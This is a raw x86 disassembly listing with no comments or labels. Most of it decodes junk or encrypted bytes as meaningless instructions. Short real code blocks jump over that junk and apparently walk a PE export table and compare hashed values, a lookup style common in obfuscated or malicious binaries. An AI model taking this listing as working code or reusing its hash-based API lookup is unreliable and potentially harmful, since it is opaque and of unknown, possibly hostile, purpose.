  40af15:	sub    ecx,edi
  40af17:	mov    WORD PTR [ebp-0x4],cx
  40af1b:	jmp    0x40af2d
  40af20:	xor    eax,esi
  40af22:	lea    eax,[eax+ecx*1+0x32729c]
  40af29:	mov    WORD PTR [ebp-0x4],ax
  40af2d:	mov    eax,DWORD PTR [ebp-0xc]
  40af30:	cmp    eax,ebx
  40af32:	je     0x40af46
  40af38:	mov    eax,DWORD PTR [ebp-0x8]
  40af3b:	mov    DWORD PTR [eax],0x60341e89
  40af41:	jmp    0x40bbf5
  40af46:	mov    eax,DWORD PTR [ebp+0x8]
  40af49:	mov    ecx,DWORD PTR [ebp-0x8]
  40af4c:	xor    eax,esi
  40af4e:	add    eax,edi
  40af50:	cmp    DWORD PTR [ecx],eax
  40af52:	je     0x40ba25
  40af58:	jmp    0x40b110
  40af5d:	icebp  
  40af5e:	in     eax,dx
  40af5f:	popf   
  40af60:	adc    BYTE PTR [ecx+0xcf17160],ah
  40af66:	xchg   esi,eax
  40af67:	cld    
  40af68:	ins    DWORD PTR es:[edi],dx
  40af69:	mov    eax,0x461b2ce4
  40af6e:	jmp    0x7070:0x7f957070
  40af75:	clc    
  40af76:	inc    edx
  40af77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af78:	or     DWORD PTR [edx-0x1a77b642],ecx
  40af7e:	outs   dx,DWORD PTR ds:[esi]
  40af7f:	or     ch,BYTE PTR [ecx+0xdc17d68]
  40af85:	pusha  
  40af86:	mov    bl,BYTE PTR [ecx]
  40af88:	pop    es
  40af89:	jmp    0x8e904f1e
  40af8e:	jb     0x40af82
  40af90:	inc    esp
  40af91:	mov    eax,ds:0x473cc261
  40af96:	(bad)  
  40af97:	loope  0x40af50
  40af99:	and    eax,0x491ecc53
  40af9e:	inc    ebp
  40af9f:	xchg   edi,eax
  40afa0:	rcr    BYTE PTR ds:0xf0943a70,0xef
  40afa7:	sahf   
  40afa8:	pop    edi
  40afa9:	sahf   
  40afaa:	frstor [ebx]
  40afac:	in     al,dx
  40afad:	inc    edx
  40afae:	ror    DWORD PTR [esi],1
  40afb0:	and    DWORD PTR [ecx+esi*1+0xa9cd2f4],ebx
  40afb7:	or     DWORD PTR [edi-0x4a],eax
  40afba:	inc    edx
  40afbb:	pop    esp
  40afbc:	fcomip st,st(0)
  40afbe:	ins    DWORD PTR es:[edi],dx
  40afbf:	push   edx
  40afc0:	es shl BYTE PTR es:[eax-0x5c],cl
  40afc5:	mov    edx,0x4b199a91
  40afca:	pop    eax
  40afcb:	test   eax,0x35b98bf3
  40afd0:	xor    eax,0xe85e5405
  40afd5:	adc    ch,cl
  40afd7:	pop    eax
  40afd8:	xor    BYTE PTR ds:0x47f444b1,bl
  40afde:	and    eax,0xfffa6a91
  40afe3:	jb     0x40b00a
  40afe5:	popa   
  40afe6:	push   0xbea593b2
  40afeb:	mov    BYTE PTR [ebx],ah
  40afed:	mov    es,WORD PTR [edx+0x6c]
  40aff0:	clc    
  40aff1:	bound  ecx,QWORD PTR [edi]
  40aff3:	dec    ebp
  40aff4:	mov    WORD PTR [ecx+eiz*2+0x48],es
  40aff8:	imul   BYTE PTR [eax-0x5846c031]
  40affe:	psubusb mm2,mm0
  40b001:	xchg   DWORD PTR [edx-0x12],edi
  40b004:	fbstp  TBYTE PTR [edi]
  40b006:	ret    
  40b007:	adc    bh,BYTE PTR [eax-0x6088d201]
  40b00d:	cs arpl WORD PTR ss:[edx-0x92ce408],bx
  40b015:	ins    DWORD PTR es:[edi],dx
  40b016:	stc    
  40b017:	gs loop 0x40afd5
  40b01a:	pop    es
  40b01b:	ins    BYTE PTR es:[edi],dx
  40b01c:	xor    bl,BYTE PTR [edi+ecx*1+0x3b]
  40b020:	mov    WORD PTR [edx],es
  40b022:	xchg   esi,eax
  40b023:	or     al,0x6f
  40b025:	adc    al,0x5c
  40b027:	xchg   edx,eax
  40b028:	xor    al,0x2d
  40b02a:	cli    
  40b02b:	je     0x40b07a
  40b02d:	xchg   edi,eax
  40b02e:	push   ebx
  40b02f:	ret    0xb38f
  40b032:	or     dh,ch
  40b034:	in     al,0x88
  40b036:	ficomp WORD PTR [edx-0x49]
  40b039:	ror    BYTE PTR [eax],cl
  40b03b:	xchg   edx,eax
  40b03c:	mov    cl,0x51
  40b03e:	je     0x40b0a2
  40b040:	scas   al,BYTE PTR es:[edi]
  40b041:	bound  edx,QWORD PTR [ebx]
  40b043:	rcl    BYTE PTR [eax-0x59b0bcdd],1
  40b049:	lods   al,BYTE PTR ds:[esi]
  40b04a:	jnp    0x40b055
  40b04c:	push   ss
  40b04d:	mov    al,ds:0x57ef80f5
  40b052:	sub    al,0x7d
  40b054:	mov    ecx,0x31b5be47
  40b059:	or     BYTE PTR [edx+ecx*2],bh
  40b05c:	or     eax,0xa14e780f
  40b061:	scas   eax,DWORD PTR es:[edi]
  40b062:	jne    0x40b038
  40b064:	sub    eax,0x313928ab
  40b069:	and    BYTE PTR [edi+0xa],ah
  40b06c:	popf   
  40b06d:	pop    esi
  40b06e:	push   ebp
  40b06f:	cmp    ah,BYTE PTR [edi]
  40b071:	loop   0x40b0a9
  40b073:	or     al,0x89
  40b075:	dec    ecx
  40b076:	sub    al,0x6
  40b078:	fdivrp st(0),st
  40b07a:	repz push cs
  40b07c:	fstp   TBYTE PTR [esi+ebx*8-0x3b]
  40b080:	inc    edx
  40b081:	lock push es
  40b083:	das    
  40b084:	sbb    bh,0x37
  40b087:	aas    
  40b088:	loop   0x40b105
  40b08a:	shr    BYTE PTR [ebx],cl
  40b08c:	mov    cl,0x29
  40b08e:	rol    DWORD PTR [ebx-0x1a],cl
  40b091:	int    0xc2
  40b093:	jecxz  0x40b028
  40b095:	(bad)  
  40b096:	xchg   edi,eax
  40b097:	jb     0x40b093
  40b099:	sub    ch,bl
  40b09b:	stos   BYTE PTR es:[edi],al
  40b09c:	adc    BYTE PTR [ecx+0x79],bh
  40b09f:	and    eax,0xed6d266f
  40b0a4:	(bad)
  40b0a7:	popf   
  40b0a8:	mov    bh,0x39
  40b0aa:	lock cmp dh,dh
  40b0ad:	jp     0x40b0b7
  40b0af:	add    ecx,DWORD PTR [edx-0x5f2175c7]
  40b0b5:	adc    eax,0x12712c13
  40b0ba:	sbb    BYTE PTR gs:0xd25f84fb,al
  40b0c1:	mov    al,0xf
  40b0c3:	inc    esp
  40b0c4:	or     bh,BYTE PTR [ecx+0x663a1cce]
  40b0ca:	or     al,0x4b
  40b0cc:	into   
  40b0cd:	outs   dx,DWORD PTR ds:[esi]
  40b0ce:	sub    ebp,ebx
  40b0d0:	or     al,0xc7
  40b0d2:	sub    esi,eax
  40b0d4:	jno    0x40b0df
  40b0d6:	dec    esi
  40b0d7:	sub    al,0x1f
  40b0d9:	cmp    ch,bl
  40b0db:	gs sbb ecx,ecx
  40b0de:	mov    esi,DWORD PTR [edx+0x1]
  40b0e1:	jg     0x40b162
  40b0e3:	add    ebx,DWORD PTR [eax+0x42]
  40b0e6:	dec    ebx
  40b0e7:	clc    
  40b0e8:	outs   dx,BYTE PTR ds:[esi]
  40b0e9:	xor    dh,BYTE PTR [esi-0x4f]
  40b0ec:	ins    DWORD PTR es:[edi],dx
  40b0ed:	lahf   
  40b0ee:	mov    ah,0x55
  40b0f0:	and    eax,0x8975dfa3
  40b0f5:	mov    al,dh
  40b0f7:	pop    esp
  40b0f8:	mov    al,ds:0x15431dc7
  40b0fd:	push   0xffffffe8
  40b0ff:	mov    ch,0xad
  40b101:	in     al,0xc6
  40b103:	push   ds
  40b104:	mov    esp,0x223580c5
  40b109:	pop    edi
  40b10a:	add    eax,0x86fdecf7
  40b10f:	jnp    0x45cc9962
  40b115:	clc    
  40b116:	mov    eax,DWORD PTR [eax]
  40b118:	mov    eax,DWORD PTR [eax+0x3c]
  40b11b:	lea    ecx,[ecx*8+0x78]
  40b122:	add    eax,ecx
  40b124:	mov    ecx,DWORD PTR [ebp-0x8]
  40b127:	mov    ecx,DWORD PTR [ecx]
  40b129:	mov    eax,DWORD PTR [eax+ecx*1]
  40b12c:	mov    DWORD PTR [ebp-0x20],eax
  40b12f:	mov    eax,DWORD PTR [ebp+0x8]
  40b132:	xor    eax,esi
  40b134:	add    eax,edi
  40b136:	jmp    0x40b2ee
  40b13b:	iret   
  40b13c:	dec    edi
  40b13d:	mov    bl,0xfe
  40b13f:	mov    bl,0x62
  40b141:	icebp  
  40b142:	dec    ebp
  40b143:	dec    edx
  40b144:	int    0xfa
  40b146:	dec    ebp
  40b147:	int    0x7c
  40b149:	xchg   esp,eax
  40b14a:	js     0x40b127
  40b14c:	call   0x7fd621c1
  40b151:	jo     0x40b1c3
  40b153:	je     0x40b19a
  40b155:	aad    0xf2
  40b157:	pop    ss
  40b158:	adc    esp,esp
  40b15a:	mov    ecx,0xffad104d
  40b15f:	loopne 0x40b157
  40b161:	dec    edx
  40b162:	mov    ch,0x73
  40b164:	ja     0x40b125
  40b166:	fcom   DWORD PTR [edi-0x2ed161d7]
  40b16c:	cmp    BYTE PTR [ebx+0x33162110],ah
  40b172:	dec    esi
  40b173:	mov    dl,0x80
  40b175:	mov    esp,0xa265d617
  40b17a:	mov    bh,0xf0
  40b17c:	in     eax,0x49
  40b17e:	add    DWORD PTR [esi+0x71],ebx
  40b181:	test   dl,0x1a
  40b184:	add    BYTE PTR [eax-0x4b],0x14
  40b188:	fistp  DWORD PTR [edx-0x3c]
  40b18b:	aad    0x8
  40b18d:	ret    
  40b18e:	ret    
  40b18f:	js     0x40b112
  40b191:	arpl   cx,dx
  40b193:	jno    0x40b154
  40b195:	sbb    ah,ch
  40b197:	mov    ah,0x8a
  40b199:	adc    DWORD PTR [ebx-0x641d9cc8],eax
  40b19f:	adc    al,0x64
  40b1a1:	jge    0x40b222
  40b1a3:	in     al,0x51
  40b1a5:	cld    
  40b1a6:	shl    DWORD PTR [ecx-0x68cc988e],0xb8
  40b1ad:	mov    ah,0x1
  40b1af:	or     BYTE PTR [ecx-0x758203da],cl
  40b1b5:	dec    ebp
  40b1b6:	adc    DWORD PTR [ecx-0x63],ebx
  40b1b9:	adc    edi,DWORD PTR [ebp-0x59]
  40b1bc:	es pushf 
  40b1be:	or     BYTE PTR [edx],0xe8
  40b1c1:	push   ebp
  40b1c2:	cmp    ch,BYTE PTR [ecx+0x4d]
  40b1c5:	outs   dx,BYTE PTR ds:[esi]
  40b1c6:	jbe    0x40b19c
  40b1c8:	push   ecx
  40b1c9:	scas   al,BYTE PTR es:[edi]
  40b1ca:	jp     0x40b21b
  40b1cc:	add    BYTE PTR [esi+0x26426b8f],al
  40b1d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1d3:	inc    edx
  40b1d4:	inc    eax
  40b1d5:	lock fcmovbe st,st(7)
  40b1d8:	sahf   
  40b1d9:	mov    esp,0xe58c6465
  40b1de:	test   eax,0x430e2c88
  40b1e3:	jle    0x40b1da
  40b1e5:	mov    ds:0x42868e17,al
  40b1ea:	sub    eax,0x1367b758
  40b1ef:	push   ss
  40b1f0:	jge    0x40b17c
  40b1f2:	lea    edi,[ebx]
  40b1f4:	cmp    BYTE PTR [ecx-0x7a],0x81
  40b1f8:	jecxz  0x40b246
  40b1fa:	dec    edx
  40b1fb:	cmc    
  40b1fc:	sbb    ecx,ebp
  40b1fe:	and    edi,DWORD PTR [edi+0x2e85519e]
  40b204:	xchg   ebx,eax
  40b205:	bound  esi,QWORD PTR [ebp-0x63]
  40b208:	scas   al,BYTE PTR es:[edi]
  40b209:	xor    eax,0x3d0d8460
  40b20e:	call   0x37634e4e
  40b213:	repz retf 
  40b215:	loopne 0x40b1e8
  40b217:	xor    edi,DWORD PTR [eax-0x11a81331]
  40b21d:	enter  0xbd18,0x1a
  40b221:	scas   al,BYTE PTR es:[edi]
  40b222:	popa   
  40b223:	sub    cl,BYTE PTR [ecx+0x5d03f04b]
  40b229:	mov    dl,0xbb
  40b22b:	iret   
  40b22c:	mov    eax,DWORD PTR [bx]
  40b22f:	js     0x40b285
  40b231:	aaa    
  40b232:	clc    
  40b233:	aam    0x96
  40b235:	cmp    BYTE PTR [esp+edx*8-0x72],bh
  40b239:	mov    WORD PTR [ebp+0x9],ds
  40b23c:	sbb    eax,DWORD PTR [eax+0x0]
  40b23f:	stc    
  40b240:	sbb    edx,esp
  40b242:	mov    al,0xfd
  40b244:	xchg   DWORD PTR [ecx-0x4ee077ba],eax
  40b24a:	mov    ?,WORD PTR [ebx]
  40b24c:	data16 jne 0x40b2b8
  40b24f:	mov    cl,0x1f
  40b251:	xor    DWORD PTR [edx+0x7c],ebx
  40b254:	and    eax,0xfa0d9f3a
  40b259:	sub    BYTE PTR [edi-0x5144ede4],ch
  40b25f:	sti    
  40b260:	stos   DWORD PTR es:[edi],eax
  40b261:	pop    ebx
  40b262:	cmp    edx,ebx
  40b264:	mov    bh,ch
  40b266:	adc    ebx,DWORD PTR [esi+0x32]
  40b269:	loop   0x40b22f
  40b26b:	aaa    
  40b26c:	mov    ds:0x55e0f1ce,eax
  40b271:	or     eax,0x40e6c951
  40b276:	cld    
  40b277:	sar    edx,0x1
  40b27a:	outs   dx,DWORD PTR ds:[esi]
  40b27b:	(bad)  
  40b27c:	fst    DWORD PTR [eax+esi*4+0x5b]
  40b280:	add    BYTE PTR [ebx-0x80],cl
  40b283:	fmul   DWORD PTR [esp+edi*2-0x3d]
  40b287:	adc    bl,BYTE PTR [ebp+0x33dd2f48]
  40b28d:	jmp    0x5bcc35f2
  40b292:	jns    0x40b2c5
  40b294:	sbb    eax,0x4cf6213f
  40b299:	test   al,0x30
  40b29b:	pop    es
  40b29c:	cmp    BYTE PTR ds:0x12a3a017,al
  40b2a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2a3:	jecxz  0x40b2f3
  40b2a5:	outs   dx,DWORD PTR ds:[esi]
  40b2a6:	stos   BYTE PTR es:[edi],al
  40b2a7:	les    edi,FWORD PTR [ebx]
  40b2a9:	stos   DWORD PTR es:[edi],eax
  40b2aa:	call   0xbd25:0x163ad469
  40b2b1:	stos   BYTE PTR es:[edi],al
  40b2b2:	loop   0x40b2e4
  40b2b4:	xor    BYTE PTR [ebx-0x6dd2081f],0x5b
  40b2bb:	adc    esi,ebx
  40b2bd:	jne    0x40b2a9
  40b2bf:	std    
  40b2c0:	jg     0x40b2bc
  40b2c2:	mov    esi,0x68bf69b6
  40b2c7:	sub    eax,0x67753bd9
  40b2cc:	jp     0x40b301
  40b2ce:	repnz (bad) 
  40b2d1:	mov    cs,WORD PTR [ecx+0x44]
  40b2d4:	call   0xb3c6:0x984efe47
  40b2db:	outs   dx,BYTE PTR ds:[esi]
  40b2dc:	sub    BYTE PTR [esi+0xaf584b7],ch
  40b2e2:	clc    
  40b2e3:	dec    edi
  40b2e4:	ror    DWORD PTR [edx-0x71a1d504],1
  40b2ea:	mov    esp,0x89830f9d
  40b2ef:	inc    ebp
  40b2f0:	fsub   st(1),st
  40b2f2:	mov    bl,0x1
  40b2f4:	add    BYTE PTR [eax],al
  40b2f6:	mov    cl,0x4
  40b2f8:	icebp  
  40b2f9:	in     al,0x71
  40b2fb:	icebp  
  40b2fc:	mov    cl,0x51
  40b2fe:	push   0xa3dbadc9
  40b303:	dec    eax
  40b304:	mov    esp,0x70f670ba
  40b309:	jo     0x40b2a0
  40b30b:	jg     0x40b37d
  40b30d:	jo     0x40b2ca
  40b30f:	(bad)  
  40b311:	lods   al,BYTE PTR ds:[esi]
  40b312:	jmp    0x40b2b0
  40b314:	aad    0xc8
  40b316:	test   DWORD PTR [esi+eax*2+0x67],edi
  40b31a:	test   eax,0xc7bc168e
  40b31f:	mov    bh,0x49
  40b321:	mov    edi,ecx
  40b323:	inc    ebp
  40b324:	popa   
  40b325:	or     al,0x5f
  40b327:	adc    ah,BYTE PTR [edx]
  40b329:	fsub   QWORD PTR [eax+ebp*1+0x72]
  40b32d:	leave  
  40b32e:	or     BYTE PTR [edi-0x11105e59],bl
  40b334:	es inc edi
  40b336:	dec    edx
  40b337:	sbb    eax,0x5890fe84
  40b33c:	aaa    
  40b33d:	mov    bh,0xf
  40b33f:	lock cwde 
  40b341:	inc    ebp
  40b342:	leave  
  40b343:	cli    
  40b344:	lods   al,BYTE PTR ds:[esi]
  40b345:	xor    edi,DWORD PTR [ebx+0x4e]
  40b348:	xor    BYTE PTR [ebp+0x27],ah
  40b34b:	ss call 0x7187:0xb244583d
  40b353:	mov    edi,0x37a8d6cc
  40b358:	stos   BYTE PTR es:[edi],al
  40b359:	je     0x40b364
  40b35b:	sahf   
  40b35c:	cwde   
  40b35d:	out    0x2d,eax
  40b35f:	repz je 0x40b39e
  40b362:	es or  al,0x93
  40b365:	sbb    eax,0x7d104bd2
  40b36a:	aam    0xa2
  40b36c:	dec    edi
  40b36d:	int    0x66
  40b36f:	mov    ah,0x8d
  40b371:	das    
  40b372:	cmp    bl,BYTE PTR [ebx-0x7c]
  40b375:	in     al,dx
  40b376:	inc    edx
  40b377:	fistp  QWORD PTR [ebx-0x3df5125b]
  40b37d:	and    BYTE PTR [ecx+edx*4+0x40],0x7d
  40b382:	cmp    eax,0x21bed97b
  40b387:	push   edi
  40b388:	jmp    0x40b32f
  40b38a:	xor    DWORD PTR [ecx-0x62],ebp
  40b38d:	cmp    eax,0x7d294b82
  40b392:	lods   eax,DWORD PTR ds:[esi]
  40b393:	shr    BYTE PTR [ecx-0x5ebfb4c4],1
  40b399:	repnz add esi,0x63
  40b39d:	mov    bh,0x4b
  40b39f:	mov    eax,ds:0xb5f54366
  40b3a4:	cdq    
  40b3a5:	je     0x40b3b2
  40b3a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3a8:	(bad)  
  40b3a9:	jl     0x40b3cf
  40b3ab:	sahf   
  40b3ac:	push   ds
  40b3ad:	pop    es
  40b3ae:	sbb    DWORD PTR [edi],eax
  40b3b0:	jae    0x40b38f
  40b3b2:	imul   esp,DWORD PTR [ebx],0x21ff1243
  40b3b8:	push   ebp
  40b3b9:	inc    ebx
  40b3ba:	pop    esi
  40b3bb:	jmp    0x549b:0x1aa8de21
  40b3c2:	fwait
  40b3c3:	or     DWORD PTR [esi],eax
  40b3c5:	pop    edi
  40b3c6:	sbb    ebp,ecx
  40b3c8:	leave  
  40b3c9:	dec    esi
  40b3ca:	stos   DWORD PTR es:[edi],eax
  40b3cb:	xor    DWORD PTR [edx],edx
  40b3cd:	lods   al,BYTE PTR ds:[esi]
  40b3ce:	rcl    DWORD PTR [ecx],cl
  40b3d0:	cmp    BYTE PTR [ebx],dh
  40b3d2:	scas   al,BYTE PTR es:[edi]
  40b3d3:	rcl    BYTE PTR [eax],0x76
  40b3d6:	add    BYTE PTR [ebp-0x34adc2c7],bl
  40b3dc:	cmp    al,0xd
  40b3de:	pushf  
  40b3df:	sub    dh,bl
  40b3e1:	inc    ebx
  40b3e2:	add    DWORD PTR [edx+0x11840f9],0xbc011b47
  40b3ec:	push   esp
  40b3ed:	dec    ecx
  40b3ee:	xchg   DWORD PTR [ebx+0x6a2a6267],esp
  40b3f4:	push   esp
  40b3f5:	jne    0x40b38c
  40b3f7:	inc    ebx
  40b3f8:	adc    DWORD PTR [edi+0x2ac4b341],ecx
  40b3fe:	sbb    DWORD PTR [ebx],0x6
  40b401:	das    
  40b402:	ja     0x40b3ce
  40b404:	sbb    al,BYTE PTR [ebx+0x611732c8]
  40b40a:	ja     0x40b450
  40b40c:	cmp    BYTE PTR [ebx],0xb0
  40b40f:	pop    esp
  40b410:	sub    ebx,DWORD PTR [edi+ebp*8+0x27]
  40b414:	or     al,0x85
  40b416:	stc    
  40b417:	mov    edi,0xc98cf5fc
  40b41c:	sub    dl,bh
  40b41e:	in     al,0xc3
  40b420:	iret   
  40b421:	popa   
  40b422:	inc    ecx
  40b423:	or     ebx,DWORD PTR [ecx]
  40b425:	pop    ecx
  40b426:	jnp    0x40b3c8
  40b428:	(bad)  [edx+0x45ead4f3]
  40b42e:	inc    esi
  40b42f:	imul   ebx,DWORD PTR [edi+0x7c],0xe
  40b433:	in     eax,0xcd
  40b435:	out    0xee,eax
  40b437:	sahf   
  40b438:	popf   
  40b439:	push   edx
  40b43a:	jae    0x40b3db
  40b43c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b43d:	fwait
  40b43e:	or     BYTE PTR [eax+edx*2],bh
  40b441:	mov    eax,0x5025c528
  40b446:	int    0x6b
  40b448:	pmaxsw mm3,mm0
  40b44b:	hlt    
  40b44c:	out    0x3a,eax
  40b44e:	add    BYTE PTR [edx],al
  40b450:	push   0x4b
  40b452:	jo     0x40b3f0
  40b454:	jb     0x40b408
  40b456:	call   FWORD PTR [ecx+0x37ad1cba]
  40b45c:	xchg   ebx,eax
  40b45d:	loopne 0x40b4b1
  40b45f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b460:	ds xor eax,edx
  40b463:	mov    ch,0x18
  40b465:	lds    esi,FWORD PTR [ebx+0x3]
  40b468:	cmp    DWORD PTR [edx+0x44],esi
  40b46b:	js     0x40b424
  40b46d:	or     DWORD PTR [edx],esp
  40b46f:	inc    ecx
  40b470:	js     0x40b46d
  40b472:	dec    ebx
  40b473:	imul   ebp,DWORD PTR [ecx],0xfffffff5
  40b476:	cmp    BYTE PTR fs:[ecx+0x1fa6cf5d],al
  40b47d:	inc    ebp
  40b47e:	adc    bh,dl
  40b480:	shl    dh,0x70
  40b483:	ror    edi,1
  40b485:	xor    esp,edx
  40b487:	ins    DWORD PTR es:[edi],dx
  40b488:	mov    al,ds:0x76c8adb1
  40b48d:	mov    ebp,0xb0241026
  40b492:	mov    edi,0x2bfbed28
  40b497:	sahf   
  40b498:	(bad)  
  40b499:	push   ds
  40b49a:	xchg   ebp,eax
  40b49b:	pop    es
  40b49c:	mov    eax,0xf4a564d4
  40b4a1:	xlat   BYTE PTR gs:[ebx]
  40b4a3:	inc    ecx
  40b4a4:	call   0x458b:0xc8b4dba0
  40b4ab:	or     BYTE PTR [ebx-0x39cc1fb3],cl
  40b4b1:	add    eax,edi
  40b4b3:	cmp    ecx,eax
  40b4b5:	je     0x40bbf5
  40b4bb:	mov    eax,DWORD PTR [ebp-0x8]
  40b4be:	mov    ecx,DWORD PTR [ebp-0x20]
  40b4c1:	add    ecx,DWORD PTR [eax]
  40b4c3:	mov    DWORD PTR [ebp-0x24],ecx
  40b4c6:	mov    eax,DWORD PTR [ebp-0x24]
  40b4c9:	mov    ecx,DWORD PTR [ebp-0x8]
  40b4cc:	jmp    0x40b684
  40b4d1:	dec    ecx
  40b4d2:	push   ss
  40b4d3:	sub    al,BYTE PTR ds:[ecx-0xe]
  40b4d7:	imul   esi,DWORD PTR [ebp+0x77],0xc8413075
  40b4de:	jg     0x40b4e2
  40b4e0:	xchg   esp,eax
  40b4e1:	xchg   ebp,eax
  40b4e2:	cmc    
  40b4e3:	jo     0x40b555
  40b4e5:	xchg   ebp,eax
  40b4e6:	jg     0x40b558
  40b4e8:	jo     0x40b542
  40b4ea:	mov    ebx,DWORD PTR [ecx-0x2a]
  40b4ed:	xor    edx,DWORD PTR [edx-0x64]
  40b4f0:	in     eax,dx
  40b4f1:	pop    DWORD PTR [edx-0x4d]
  40b4f4:	and    bh,dh
  40b4f6:	inc    ebx
  40b4f7:	mov    eax,ds:0xa5e91d8
  40b4fc:	dec    eax
  40b4fd:	inc    eax
  40b4fe:	popf   
  40b4ff:	lods   al,BYTE PTR ds:[esi]
  40b500:	add    BYTE PTR [ecx-0x6c],ah
  40b503:	inc    ecx
  40b504:	lods   al,BYTE PTR ds:[esi]
  40b505:	rol    DWORD PTR [ebx+0x4a],cl
  40b508:	cld    
  40b509:	push   cs
  40b50a:	(bad)  
  40b50c:	iret   
  40b50d:	or     BYTE PTR [ebx],0x70
  40b510:	sub    ebx,esp
  40b512:	jg     0x40b534
  40b514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b515:	aaa    
  40b516:	lock es leave 
  40b519:	scas   al,BYTE PTR es:[edi]
  40b51a:	sub    BYTE PTR [edx-0x7251ef8f],ch
  40b520:	mov    esp,eax
  40b522:	popa   
  40b523:	(bad)
  40b528:	shl    edx,cl
  40b52a:	xor    BYTE PTR [edx],al
  40b52c:	jg     0x40b4b8
  40b52e:	pop    edi
  40b52f:	add    DWORD PTR [ebp-0x6b8fbf40],esi
  40b535:	and    dh,BYTE PTR [ebx]
  40b537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b538:	sti    
  40b539:	xchg   esi,eax
  40b53a:	das    
  40b53b:	dec    esi
  40b53c:	fiadd  WORD PTR [bp+si]
  40b53f:	call   0x3c5f:0xf6a80533
  40b546:	shr    bh,cl
  40b548:	xchg   esp,eax
  40b549:	mov    al,0xf8
  40b54b:	sar    DWORD PTR [ecx+0x4f49c444],1
  40b551:	pop    ds
  40b552:	enter  0x2ece,0x4
  40b556:	xor    al,0x56
  40b558:	mov    cl,0x44
  40b55a:	lods   al,BYTE PTR ds:[esi]
  40b55b:	sub    eax,0xd0cfb38f
  40b560:	(bad)  
  40b561:	lods   eax,DWORD PTR ds:[esi]
  40b562:	in     al,0xec
  40b564:	push   eax
  40b565:	sub    eax,0xbb6164a9
  40b56a:	xchg   ebp,eax
  40b56b:	imul   esp,DWORD PTR ds:0x403c781f,0x5e
  40b572:	pop    ss
  40b573:	sub    eax,eax
  40b575:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b576:	stc    
  40b577:	les    ebx,FWORD PTR [ebp+0x37]
  40b57a:	jno    0x40b5b2
  40b57c:	out    0x49,al
  40b57e:	or     al,0x62
  40b580:	dec    esp
  40b581:	push   esp
  40b582:	ins    DWORD PTR es:[edi],dx
  40b583:	fsubr  st,st(0)
  40b585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b586:	and    eax,0x78978e85
  40b58b:	fucom  st(6)
  40b58d:	cmp    BYTE PTR ds:0xd684a7f9,cl
  40b593:	mov    edi,0xdd3dbbf8
  40b598:	or     eax,esp
  40b59a:	add    edx,edi
  40b59c:	les    ebp,FWORD PTR [ebx+ebx*1]
  40b59f:	aam    0x9c
  40b5a1:	imul   ebx,DWORD PTR [ebp+0x7e],0x7a
  40b5a5:	push   ss
  40b5a6:	inc    ebx
  40b5a7:	cmp    DWORD PTR [ebx],ebx
  40b5a9:	push   esp
  40b5aa:	(bad)  
  40b5ab:	and    eax,0xf6c7abb2
  40b5b0:	out    0x44,al
  40b5b2:	scas   al,BYTE PTR es:[edi]
  40b5b3:	(bad)  
  40b5b4:	and    edi,edi
  40b5b6:	push   eax
  40b5b7:	std    
  40b5b8:	mov    es:0x88be66d,eax
  40b5be:	into   
  40b5bf:	sbb    bh,BYTE PTR [ebp+0x21]
  40b5c2:	xchg   ecx,eax
  40b5c3:	and    al,BYTE PTR [eax]
  40b5c5:	inc    esp
  40b5c6:	mov    ecx,0x67888420
  40b5cb:	dec    ecx
  40b5cc:	or     bh,bl
  40b5ce:	dec    esp
  40b5cf:	fdivr  DWORD PTR [esi]
  40b5d1:	dec    ecx
  40b5d2:	mov    ds:0x688ccc65,al
  40b5d7:	inc    esi
  40b5d8:	(bad)  
  40b5da:	mul    DWORD PTR [edi+0x27]
  40b5dd:	dec    ecx
  40b5de:	inc    edx
  40b5df:	mov    dh,al
  40b5e1:	int3   
  40b5e2:	les    eax,FWORD PTR [eax+edi*1-0x64]
  40b5e6:	pop    edx
  40b5e7:	in     al,dx
  40b5e8:	gs jne 0x40b657
  40b5eb:	(bad)  
  40b5ec:	arpl   WORD PTR [edi+eax*1-0x74],bx
  40b5f0:	dec    ecx
  40b5f1:	sbb    eax,0x8dd49b31
  40b5f6:	or     DWORD PTR [ecx+0x3d],edx
  40b5f9:	sahf   
  40b5fa:	or     al,0x9
  40b5fc:	sbb    BYTE PTR ds:0x762f1bb,0xeb
  40b603:	sbb    bl,BYTE PTR [eax+0x51159633]
  40b609:	les    esi,FWORD PTR [ecx-0x3b]
  40b60c:	test   esp,ebx
  40b60e:	xor    dl,BYTE PTR [edi]
  40b610:	data16 cld 
  40b612:	push   esp
  40b613:	popf   
  40b614:	lahf   
  40b615:	push   ss
  40b616:	repz shr DWORD PTR [edi],1
  40b619:	push   ebx
  40b61a:	inc    esp
  40b61b:	rep lods al,BYTE PTR ds:[esi]
  40b61d:	clc    
  40b61e:	inc    esi
  40b61f:	jmp    0x40b5f0
  40b621:	in     al,dx
  40b622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b623:	adc    DWORD PTR [esi-0x614ffb14],eax
  40b629:	arpl   si,bp
  40b62b:	rcl    BYTE PTR [edi],0xdb
  40b62e:	ss fstp st(3)
  40b631:	xchg   ebx,eax
  40b632:	lods   eax,DWORD PTR ds:[esi]
  40b633:	in     eax,0xcb
  40b635:	xchg   edx,eax
  40b636:	mov    ebx,0x541f13c4
  40b63b:	scas   al,BYTE PTR es:[edi]
  40b63c:	push   eax
  40b63d:	test   bl,dl
  40b63f:	mov    WORD PTR [edi+ebx*8-0xa],fs
  40b643:	jmp    0x7c029774
  40b648:	cmp    ch,bh
  40b64a:	sbb    BYTE PTR [edi+0x11],bh
  40b64d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b64e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b64f:	add    ebp,DWORD PTR [edx+0x2e]
  40b652:	stos   DWORD PTR es:[edi],eax
  40b653:	sub    ah,al
  40b655:	lods   eax,DWORD PTR ds:[esi]
  40b656:	dec    ebp
  40b657:	sub    BYTE PTR [eax+0x288cff2f],ch
  40b65d:	mov    al,0xe4
  40b65f:	shr    DWORD PTR [ebp+0x688fa3e3],0x1
